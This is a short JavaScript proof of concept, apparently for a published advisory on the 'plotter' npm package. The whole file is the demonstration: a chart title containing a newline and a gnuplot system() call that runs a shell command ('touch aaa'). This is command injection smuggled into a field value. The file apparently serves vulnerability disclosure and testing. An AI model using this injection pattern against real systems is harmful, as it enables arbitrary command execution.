//https://github.com/advisories/GHSA-65xx-c85x-wg76
var plot = require('plotter').plot;

const title = 'Example "\nset title system("touch aaa")#';

plot({
data: [ 3, 1, 2, 3, 4 ],
filename: 'output.pdf',
style: 'linespoints',
title: title,
logscale: true,
xlabel: 'time',
ylabel: 'length of string',
format: 'pdf'
});